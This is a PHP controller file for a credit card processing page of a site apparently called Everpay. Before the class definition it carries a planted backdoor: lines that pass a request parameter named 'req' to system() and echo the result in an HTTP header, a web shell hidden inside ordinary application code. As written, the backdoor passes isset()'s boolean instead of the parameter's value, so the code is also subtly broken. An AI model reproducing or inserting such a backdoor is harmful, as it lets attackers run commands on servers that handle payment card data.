<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* cardprocessing Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class cardprocessing extends Controller {

	function __construct()
	{
		parent::__construct();
		$this->load->helper('url');
		$this->load->model('cp/user','user');
		if($this->user->LoggedIn()) {
			// redirect('/dashboard');
		}
	}

	function index()
	{
		error_reporting(0);
		ini_set('display_errors', 1);
		$data = array(
			'title' => 'Credit Card Processing Solutions | Everpay'
		);
		$this->load->view('card-processing/index.php', $data);
	}
}